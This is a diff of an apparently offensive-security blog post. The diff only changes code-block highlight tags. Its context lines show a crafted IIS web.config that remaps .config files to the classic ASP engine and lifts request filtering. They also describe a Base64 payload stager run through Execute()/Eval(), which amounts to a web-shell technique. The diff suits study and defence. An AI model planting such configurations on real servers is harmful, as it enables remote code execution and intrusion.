@@ -147,7 +147,7 @@ What can we do about it?
 
 We can transform our string into something that will only make sense when executed. There's a couple of ways to achieve this and I'll be showing you the easiest way:
 
-{% highlight visual basic %}
+{% highlight vb %}
 ...
 Dim x
 x = Split("a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s",",")
@@ -233,7 +233,7 @@ Since we are going with the default script engine, VBScript, we are passing `--l
 
 And that's it, just copy and past to our "web.config" and execute it:
 
-{% highlight visual basic %}
+{% highlight vb %}
 <?xml version="1.0" encoding="UTF-8"?><configuration><system.webServer><handlers accessPolicy="Read, Script, Write"><add name="new_policy" path="*.config" verb="GET" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /></handlers><security><requestFiltering><fileExtensions><remove fileExtension=".config" /></fileExtensions><hiddenSegments><remove segment="web.config" /></hiddenSegments></requestFiltering></security></system.webServer><appSettings></appSettings></configuration>
 <!–-
 <% 
@@ -407,7 +407,7 @@ So let's create something that will serve as a stager for our payload, the easie
 
 Since we are using classic ASP, we can receive our payload using the "Request()" function, decode it's Base64 content and execute with a combination of "Execute()" and "Eval()".
 
-{% highlight visual basic %}
+{% highlight vb %}
 <?xml version="1.0" encoding="UTF-8"?><configuration><system.webServer><handlers accessPolicy="Read, Script, Write"><add name="new_policy" path="*.config" verb="GET,POST" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /></handlers><security><requestFiltering><fileExtensions><remove fileExtension=".config" /></fileExtensions><hiddenSegments><remove segment="web.config" /></hiddenSegments></requestFiltering></security></system.webServer><appSettings></appSettings></configuration>
 <!–-
 <% 
